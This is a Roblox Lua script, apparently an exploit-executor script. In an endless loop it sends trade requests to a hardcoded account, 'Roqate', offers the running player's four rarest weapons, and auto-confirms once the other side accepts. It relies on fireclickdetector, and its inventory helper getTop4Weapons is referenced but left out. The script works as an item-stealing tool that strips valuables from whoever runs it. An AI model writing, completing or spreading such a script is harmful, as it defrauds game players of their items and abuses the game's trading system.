local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- Config
local TARGET_PLAYER = "Roqate"
local MAX_ITEMS_PER_TRADE = 4
local TRADE_COOLDOWN = 2
local ITEM_ADD_DELAY = 0.5
local UI_WAIT_TIMEOUT = 10
local ACCEPT_WAIT_TIMEOUT = 20

-- Rarity priority
local RARITY_PRIORITY = { Godly = 1, Ancient = 2, Unique = 3, Classic = 4 }
local ALLOWED_RARITIES = {}
for r,_ in pairs(RARITY_PRIORITY) do ALLOWED_RARITIES[r] = true end

-- Remotes
local TradeRemotes = {
    SendRequest = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendRequest"),
    OfferItem = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("OfferItem")
}

-- === Inventory Functions === (keep same as before)

-- === UI Detection ===
local function findAcceptButton(gui)
    -- First try common button names
    local commonNames = {"Accept", "AcceptButton", "Confirm", "BtnAccept"}
    for _, name in pairs(commonNames) do
        local button = gui:FindFirstChild(name, true)
        if button and button:IsA("TextButton") then
            return button
        end
    end
    
    -- Fallback: Search for any button containing "accept"
    for _, descendant in ipairs(gui:GetDescendants()) do
        if descendant:IsA("TextButton") and string.find(string.lower(descendant.Text), "accept") then
            return descendant
        end
    end
    return nil
end

local function waitForButtonState(button, originalState)
    local startTime = os.clock()
    while os.clock() - startTime < ACCEPT_WAIT_TIMEOUT do
        -- Check if button properties changed (color, text, etc.)
        if button.BackgroundColor3 ~= originalState.BackgroundColor3 or
           button.Text ~= originalState.Text or
           button.TextColor3 ~= originalState.TextColor3 then
            return true
        end
        
        -- Check if "other player accepted" message appears
        for _, label in ipairs(button.Parent:GetDescendants()) do
            if label:IsA("TextLabel") and string.find(string.lower(label.Text), "other player has accepted") then
                return true
            end
        end
        
        task.wait(0.1)
    end
    return false
end

local function clickButton(button)
    -- First click
    button:SetAttribute("LastClicked", os.time())
    fireclickdetector(button:FindFirstChildOfClass("ClickDetector") or button)
    task.wait(0.1)
    
    -- Second click (double click)
    button:SetAttribute("LastClicked", os.time())
    fireclickdetector(button:FindFirstChildOfClass("ClickDetector") or button)
    print("✅ Double-clicked accept button")
end

-- === Trade Functions ===
local function doTradeCycle(targetPlayer)
    print("\n🔄 Starting trade with", targetPlayer.Name)
    
    -- 1. Send trade request
    local success, err = pcall(function()
        TradeRemotes.SendRequest:InvokeServer(targetPlayer)
    end)
    if not success then
        warn("❌ Trade request failed:", err)
        return
    end
    print("✅ Request sent - waiting for UI...")
    
    -- 2. Wait for trade GUI
    local startTime = os.clock()
    local gui
    while os.clock() - startTime < UI_WAIT_TIMEOUT do
        gui = LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") or LocalPlayer.PlayerGui:FindFirstChild("TradeGUI_Phone")
        if gui then break end
        task.wait(0.2)
    end
    
    if not gui then
        warn("⚠ Trade GUI not found!")
        return
    end
    print("✅ Trade GUI found")
    
    -- 3. Add all items without verification
    local weapons = getTop4Weapons()
    if #weapons > 0 then
        print("➕ Adding items:", table.concat(weapons, ", "))
        for _, weapon in ipairs(weapons) do
            pcall(function()
                TradeRemotes.OfferItem:FireServer(weapon, "Weapons")
            end)
            task.wait(ITEM_ADD_DELAY)
        end
    end
    
    -- 4. Find and monitor accept button
    local acceptButton = findAcceptButton(gui)
    if not acceptButton then
        warn("⚠ Accept button not found!")
        return
    end
    
    local originalButtonState = {
        BackgroundColor3 = acceptButton.BackgroundColor3,
        Text = acceptButton.Text,
        TextColor3 = acceptButton.TextColor3
    }
    
    print("👀 Monitoring accept button...")
    if waitForButtonState(acceptButton, originalButtonState) then
        print("✅ Other player accepted - confirming trade")
        clickButton(acceptButton)
    else
        warn("⚠ Timeout waiting for other player!")
    end
    
    -- Wait for trade completion
    task.wait(3)
    print("✅ Cycle complete\n")
end

-- === Main Loop ===
while true do
    local target = Players:FindFirstChild(TARGET_PLAYER)
    if target then
        doTradeCycle(target)
    else
        print("Waiting for", TARGET_PLAYER, "...")
    end
    task.wait(TRADE_COOLDOWN)
end
